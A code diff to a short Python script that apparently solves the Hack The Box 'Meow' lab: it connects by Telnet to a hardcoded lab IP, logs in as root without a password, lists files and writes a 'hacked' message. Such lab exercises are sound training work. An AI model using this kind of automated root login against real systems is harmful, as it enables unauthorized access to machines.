@@ -1,6 +1,14 @@
-import telnetlib
+import telnetlib # Imports
+import info
 import sys
-HOST = input("enter your host IP:")
-tn=telnetlib.Telnet(HOST)
+HOST = "10.129.28.1" #input("Enter your host IP: ") # Where you enter the IP of the machine
+PORT = "23" # Default Telnet port
+print(info.headermessage) # Prints the "GeckScript message"
+print(info.meowmessage)
+tn=telnetlib.Telnet(HOST,PORT) # Connects to the Telnet Server
+tn.write(b'root\n') # Enters the Meow Password
+tn.write(b'dir\n') # Shows Directory
+tn.read_until(b"snap") # Reads until the "snap" folder, cleans up the output, remove/comment the line to see what I mean
+tn.write(info.Hacked_Message)  
 x = tn.read_all()
-print (x)
+print(x)
